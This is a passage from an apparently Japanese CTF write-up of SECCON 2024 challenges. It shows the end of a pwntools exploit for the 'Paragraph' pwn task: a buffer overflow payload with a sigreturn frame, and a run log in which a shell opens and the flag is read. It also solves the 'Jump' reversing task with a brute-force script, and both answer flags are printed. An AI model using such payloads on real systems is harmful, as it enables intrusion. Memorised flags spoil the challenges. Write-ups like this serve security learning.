</span></span><span style=display:flex><span><span style=color:#aa89ea>phrase1</span> <span style=color:#54b1c7>=</span> <span style=color:#98c379>b</span><span style=color:#63c381>&#34; answered, a bit confused.</span><span style=color:#d26464;font-weight:700>\n\&#34;</span><span style=color:#63c381>Welcome to SECCON,</span><span style=color:#d26464;font-weight:700>\&#34;</span><span style=color:#63c381> the cat greeted &#34;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>=</span> \
</span></span><span style=display:flex><span>    <span style=color:#98c379>b</span><span style=color:#63c381>&#34;A&#34;</span> <span style=color:#54b1c7>*</span> <span style=color:#d19a66>0x28</span> \
</span></span><span style=display:flex><span>    <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>mod_rax</span><span style=color:#abb2bf>)</span> \
</span></span><span style=display:flex><span>    <span style=color:#54b1c7>+</span> <span style=color:#e5c07b>bytes</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>sigret_frame</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>phrase2</span> <span style=color:#54b1c7>=</span> <span style=color:#98c379>b</span><span style=color:#63c381>&#34; warmly.</span><span style=color:#d26464;font-weight:700>\n</span><span style=color:#63c381>l&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34;[!] payload: </span><span style=color:#98c379>{</span><span style=color:#aa89ea>payload</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>phrase1</span> <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>phrase2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>sendline</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>payload</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>interactive</span><span style=color:#abb2bf>()</span>
</span></span></code></pre></div><p>実行するとこんな感じ.</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>+</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>Opening</span> <span style=color:#aa89ea>connection</span> <span style=color:#aa89ea>to</span> <span style=color:#aa89ea>paragraph</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>seccon</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>games</span> <span style=color:#aa89ea>on</span> <span style=color:#aa89ea>port</span> <span style=color:#d19a66>5000</span><span style=color:#abb2bf>:</span> <span style=color:#aa89ea>Done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>!</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>Could</span> <span style=color:#b756ff;font-weight:700>not</span> <span style=color:#aa89ea>populate</span> <span style=color:#aa89ea>PLT</span><span style=color:#abb2bf>:</span> <span style=color:#aa89ea>No</span> <span style=color:#aa89ea>module</span> <span style=color:#aa89ea>named</span> <span style=color:#98c379>&#39;distutils&#39;</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>*</span><span style=color:#abb2bf>]</span> <span style=color:#98c379>&#39;/ctf/2024/seccon/Paragraph/libc.so.6&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>Arch</span><span style=color:#abb2bf>:</span>       <span style=color:#aa89ea>amd64</span><span style=color:#54b1c7>-</span><span style=color:#d19a66>64</span><span style=color:#54b1c7>-</span><span style=color:#aa89ea>little</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>RELRO</span><span style=color:#abb2bf>:</span>      <span style=color:#aa89ea>Full</span> <span style=color:#aa89ea>RELRO</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>Stack</span><span style=color:#abb2bf>:</span>      <span style=color:#aa89ea>Canary</span> <span style=color:#aa89ea>found</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>NX</span><span style=color:#abb2bf>:</span>         <span style=color:#aa89ea>NX</span> <span style=color:#aa89ea>enabled</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>PIE</span><span style=color:#abb2bf>:</span>        <span style=color:#aa89ea>PIE</span> <span style=color:#aa89ea>enabled</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>SHSTK</span><span style=color:#abb2bf>:</span>      <span style=color:#aa89ea>Enabled</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>IBT</span><span style=color:#abb2bf>:</span>        <span style=color:#aa89ea>Enabled</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>!</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>Could</span> <span style=color:#b756ff;font-weight:700>not</span> <span style=color:#aa89ea>populate</span> <span style=color:#aa89ea>PLT</span><span style=color:#abb2bf>:</span> <span style=color:#aa89ea>No</span> <span style=color:#aa89ea>module</span> <span style=color:#aa89ea>named</span> <span style=color:#98c379>&#39;distutils&#39;</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>*</span><span style=color:#abb2bf>]</span> <span style=color:#98c379>&#39;/ctf/2024/seccon/Paragraph/chall&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>Arch</span><span style=color:#abb2bf>:</span>       <span style=color:#aa89ea>amd64</span><span style=color:#54b1c7>-</span><span style=color:#d19a66>64</span><span style=color:#54b1c7>-</span><span style=color:#aa89ea>little</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>RELRO</span><span style=color:#abb2bf>:</span>      <span style=color:#aa89ea>Partial</span> <span style=color:#aa89ea>RELRO</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>Stack</span><span style=color:#abb2bf>:</span>      <span style=color:#aa89ea>No</span> <span style=color:#aa89ea>canary</span> <span style=color:#aa89ea>found</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>NX</span><span style=color:#abb2bf>:</span>         <span style=color:#aa89ea>NX</span> <span style=color:#aa89ea>enabled</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>PIE</span><span style=color:#abb2bf>:</span>        <span style=color:#aa89ea>No</span> <span style=color:#aa89ea>PIE</span> <span style=color:#abb2bf>(</span><span style=color:#d19a66>0x400000</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>SHSTK</span><span style=color:#abb2bf>:</span>      <span style=color:#aa89ea>Enabled</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>IBT</span><span style=color:#abb2bf>:</span>        <span style=color:#aa89ea>Enabled</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>Stripped</span><span style=color:#abb2bf>:</span>   <span style=color:#aa89ea>No</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>*</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>Loaded</span> <span style=color:#d19a66>111</span> <span style=color:#aa89ea>cached</span> <span style=color:#aa89ea>gadgets</span> <span style=color:#76a9f9>for</span> <span style=color:#98c379>&#39;./libc.so.6&#39;</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[;]</span> <span style=color:#aa89ea>Waiting</span><span style=color:#54b1c7>...</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>!</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>printf</span><span style=color:#abb2bf>:</span> <span style=color:#d19a66>0x600f0</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>!</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>scanf</span><span style=color:#abb2bf>:</span> <span style=color:#d19a66>0x5fe00</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>!</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>ret</span><span style=color:#abb2bf>:</span> <span style=color:#d19a66>0x2a1ca</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>!</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>printf</span> <span style=color:#aa89ea>got</span><span style=color:#abb2bf>:</span> <span style=color:#d19a66>0x404028</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>!</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>lower</span><span style=color:#abb2bf>:</span> <span style=color:#d19a66>0x1e00</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>!</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>glibc</span> <span style=color:#aa89ea>base</span><span style=color:#abb2bf>:</span> <span style=color:#d19a66>0x7f1a502a2000</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>!</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>payload</span><span style=color:#abb2bf>:</span> <span style=color:#98c379>b</span><span style=color:#63c381>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!s.P</span><span style=color:#d26464;font-weight:700>\x1a\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#63c381>/</span><span style=color:#d26464;font-weight:700>\xd4</span><span style=color:#63c381>FP</span><span style=color:#d26464;font-weight:700>\x1a\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#63c381>;</span><span style=color:#d26464;font-weight:700>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#63c381>&#39;s.P</span><span style=color:#d26464;font-weight:700>\x1a\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#63c381>3</span><span style=color:#d26464;font-weight:700>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style=color:#63c381>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>*</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>Switching</span> <span style=color:#aa89ea>to</span> <span style=color:#aa89ea>interactive</span> <span style=color:#aa89ea>mode</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>(</span>@@<span style=color:#54b1c7>$</span>
</span></span><span style=display:flex><span><span style=color:#54b1c7>$</span> <span style=color:#aa89ea>cd</span> <span style=color:#54b1c7>/</span>
</span></span><span style=display:flex><span><span style=color:#54b1c7>$</span> <span style=color:#aa89ea>ls</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>app</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>bin</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>boot</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>dev</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>etc</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>flag</span><span style=color:#54b1c7>-</span><span style=color:#d19a66>7</span><span style=color:#aa89ea>be278fe51857375210d562e53f6097e</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>txt</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>home</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>lib</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>lib64</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>media</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>mnt</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>opt</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>proc</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>root</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>run</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sbin</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>srv</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sys</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>tmp</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>usr</span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>var</span>
</span></span><span style=display:flex><span><span style=color:#54b1c7>$</span> <span style=color:#aa89ea>cat</span> <span style=color:#aa89ea>flag</span><span style=color:#54b1c7>-</span><span style=color:#d19a66>7</span><span style=color:#aa89ea>be278fe51857375210d562e53f6097e</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>txt</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>SECCON</span><span style=color:#abb2bf>{</span><span style=color:#aa89ea>The_cat_seemed_surprised_when_you_showed_this_flag</span><span style=color:#54b1c7>.</span><span style=color:#abb2bf>}</span>
</span></span><span style=display:flex><span><span style=color:#54b1c7>$</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>*</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>Interrupted</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>[</span><span style=color:#54b1c7>*</span><span style=color:#abb2bf>]</span> <span style=color:#aa89ea>Closed</span> <span style=color:#aa89ea>connection</span> <span style=color:#aa89ea>to</span> <span style=color:#aa89ea>paragraph</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>seccon</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>games</span> <span style=color:#aa89ea>port</span> <span style=color:#d19a66>5000</span>
</span></span></code></pre></div><p>FLAG: <code>SECCON{The_cat_seemed_surprised_when_you_showed_this_flag.}</code></p><p>書いたコードがバグっているのか単に1/16を引けてないのかわからないのがもどかしかった.</p><h2 id=rev-jump-118pt-69teams>rev: Jump (118pt, 69teams)
<a class=heading-link href=#rev-jump-118pt-69teams><i class="fa-solid fa-link" aria-hidden=true title=見出しへのリンク></i>
<span class=sr-only>見出しへのリンク</span></a></h2><p>aarch64のrev問題.</p><p>チームメイトのliesegangさんによって割と解析が進んでいる状態で助太刀に入った. SECCONの運営がDiscordでバイナリを通るフラグが複数あることに言及していたように, angrで解くと大量の答えが出たとのことだった. また, Ghidraで見たときに, 以下の処理が文字列を4文字ずつ確認する操作のように思えるという啓示をいただいた.</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>(</span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#d19a66>1</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#aa89ea>param_1</span> <span style=color:#54b1c7>==</span> <span style=color:#d19a66>0x336b3468</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>!=</span> <span style=color:#d19a66>0</span><span style=color:#abb2bf>;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>(</span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#d19a66>1</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#aa89ea>param_1</span> <span style=color:#54b1c7>==</span> <span style=color:#d19a66>0x5f74315f</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>!=</span> <span style=color:#d19a66>0</span><span style=color:#abb2bf>;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>(</span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#d19a66>1</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#aa89ea>param_1</span> <span style=color:#54b1c7>==</span> <span style=color:#d19a66>0x357b4e4f</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>!=</span> <span style=color:#d19a66>0</span><span style=color:#abb2bf>;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>(</span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#d19a66>1</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>(</span><span style=color:#e5c07b>int</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>)(</span><span style=color:#aa89ea>param_1</span> <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>DAT_00412038</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>+</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>(</span><span style=color:#e5c07b>int</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>)(</span><span style=color:#aa89ea>param_1</span> <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>DAT_00412038</span> <span style=color:#54b1c7>+</span> <span style=color:#54b1c7>-</span><span style=color:#d19a66>4</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>==</span> <span style=color:#54b1c7>-</span><span style=color:#d19a66>0x62629d6b</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>!=</span> <span style=color:#d19a66>0</span><span style=color:#abb2bf>;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>(</span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#d19a66>1</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>(</span><span style=color:#e5c07b>int</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>)(</span><span style=color:#aa89ea>param_1</span> <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>DAT_00412038</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>+</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>(</span><span style=color:#e5c07b>int</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>)(</span><span style=color:#aa89ea>param_1</span> <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>DAT_00412038</span> <span style=color:#54b1c7>+</span> <span style=color:#54b1c7>-</span><span style=color:#d19a66>4</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>==</span> <span style=color:#54b1c7>-</span><span style=color:#d19a66>0x6b2c5e2c</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>!=</span> <span style=color:#d19a66>0</span><span style=color:#abb2bf>;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>(</span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#d19a66>1</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>(</span><span style=color:#e5c07b>int</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>)(</span><span style=color:#aa89ea>param_1</span> <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>DAT_00412038</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>-</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>(</span><span style=color:#e5c07b>int</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>)(</span><span style=color:#aa89ea>param_1</span> <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>DAT_00412038</span> <span style=color:#54b1c7>+</span> <span style=color:#54b1c7>-</span><span style=color:#d19a66>4</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>==</span> <span style=color:#d19a66>0x47cb363b</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>!=</span> <span style=color:#d19a66>0</span><span style=color:#abb2bf>;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>(</span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#d19a66>1</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#aa89ea>param_1</span> <span style=color:#54b1c7>==</span> <span style=color:#d19a66>0x43434553</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>!=</span> <span style=color:#d19a66>0</span><span style=color:#abb2bf>;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>(</span><span style=color:#aa89ea>DAT_00412030</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#d19a66>1</span> <span style=color:#54b1c7>&amp;</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>(</span><span style=color:#e5c07b>int</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>)(</span><span style=color:#aa89ea>param_1</span> <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>DAT_00412038</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>+</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>(</span><span style=color:#e5c07b>int</span> <span style=color:#54b1c7>*</span><span style=color:#abb2bf>)(</span><span style=color:#aa89ea>param_1</span> <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>DAT_00412038</span> <span style=color:#54b1c7>+</span> <span style=color:#54b1c7>-</span><span style=color:#d19a66>4</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>==</span> <span style=color:#54b1c7>-</span><span style=color:#d19a66>0x626b6223</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>!=</span> <span style=color:#d19a66>0</span><span style=color:#abb2bf>;</span>
</span></span></code></pre></div><p>なんかguessできそう.</p><p>ということで, 値を足したり引いたりした時にありえるパターンを全列挙してちゃんとした文字列になっているものを取捨選択していったらフラグを得た. 以下が実際に作業したファイルの成れの果てである. 上の<code>seeds</code>に直接比較されている数値を入れて, 下の<code>diffs</code>に比較に用いられた数字を入れると適当に全列挙してくれるスクリプトである. だいぶ候補が絞れていくので<code>diffs</code>は実行のたびに要素が少なくなっていく.</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#76a9f9>from</span> <span style=color:#ca72ff>pwn</span> <span style=color:#76a9f9>import</span> <span style=color:#54b1c7>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>seeds</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>[</span><span style=color:#d19a66>0x43434553</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x357b4e4f</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>0x336b3468</span><span style=color:#abb2bf>,</span> <span style=color:#abb2bf>(</span><span style=color:#54b1c7>-</span> <span style=color:#d19a66>0x5f74315f</span> <span style=color:#54b1c7>-</span> <span style=color:#d19a66>0x6b2c5e2c</span> <span style=color:#54b1c7>+</span> <span style=color:#d19a66>0x626b6223</span> <span style=color:#54b1c7>-</span> <span style=color:#d19a66>0x62629d6b</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>%</span> <span style=color:#d19a66>0x100000000</span><span style=color:#abb2bf>]</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>diffs</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>[</span><span style=color:#d19a66>0x47cb363b</span><span style=color:#abb2bf>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic># 0x5f74315f, 0x6b2c5e2c</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>for</span> <span style=color:#aa89ea>seed</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#aa89ea>seeds</span><span style=color:#abb2bf>:</span>
</span></span><span style=display:flex><span>    <span style=color:#76a9f9>for</span> <span style=color:#aa89ea>diff</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#aa89ea>diffs</span><span style=color:#abb2bf>:</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34;</span><span style=color:#98c379>{</span><span style=color:#aa89ea>p32</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>seed</span><span style=color:#abb2bf>)</span><span style=color:#98c379>}</span><span style=color:#63c381>, </span><span style=color:#98c379>{</span><span style=color:#aa89ea>p32</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>diff</span><span style=color:#abb2bf>)</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34; </span><span style=color:#98c379>{</span><span style=color:#aa89ea>p32</span><span style=color:#abb2bf>((</span><span style=color:#aa89ea>seed</span> <span style=color:#54b1c7>-</span> <span style=color:#aa89ea>diff</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>%</span> <span style=color:#d19a66>0x100000000</span><span style=color:#abb2bf>)</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34; </span><span style=color:#98c379>{</span><span style=color:#aa89ea>p32</span><span style=color:#abb2bf>((</span><span style=color:#aa89ea>diff</span> <span style=color:#54b1c7>-</span> <span style=color:#aa89ea>seed</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>%</span> <span style=color:#d19a66>0x100000000</span><span style=color:#abb2bf>)</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34; </span><span style=color:#98c379>{</span><span style=color:#aa89ea>p32</span><span style=color:#abb2bf>((</span><span style=color:#aa89ea>seed</span> <span style=color:#54b1c7>+</span> <span style=color:#aa89ea>diff</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>%</span> <span style=color:#d19a66>0x100000000</span><span style=color:#abb2bf>)</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span><span style=color:#abb2bf>(</span><span style=color:#98c379>f</span><span style=color:#63c381>&#34; </span><span style=color:#98c379>{</span><span style=color:#aa89ea>p32</span><span style=color:#abb2bf>((</span><span style=color:#54b1c7>-</span><span style=color:#aa89ea>seed</span> <span style=color:#54b1c7>-</span> <span style=color:#aa89ea>diff</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>%</span> <span style=color:#d19a66>0x100000000</span><span style=color:#abb2bf>)</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>)</span>
</span></span></code></pre></div><p>FLAG: <code>SECCON{5h4k3_1t_up_5h-5h-5h5hk3}</code></p><p>解析パートはliesegangさんだし, 最後にguessだけしたので"自分が解いた問題"に含めるべきではないという考え.</p><h2 id=まとめ>まとめ
<a class=heading-link href=#%e3%81%be%e3%81%a8%e3%82%81><i class="fa-solid fa-link" aria-hidden=true title=見出しへのリンク></i>
<span class=sr-only>見出しへのリンク</span></a></h2><p>もっと知識と技術をつけて出直してきます.</p><h2 id=おまけ-時間の使い方>(おまけ) 時間の使い方
<a class=heading-link href=#%e3%81%8a%e3%81%be%e3%81%91-%e6%99%82%e9%96%93%e3%81%ae%e4%bd%bf%e3%81%84%e6%96%b9><i class="fa-solid fa-link" aria-hidden=true title=見出しへのリンク></i>
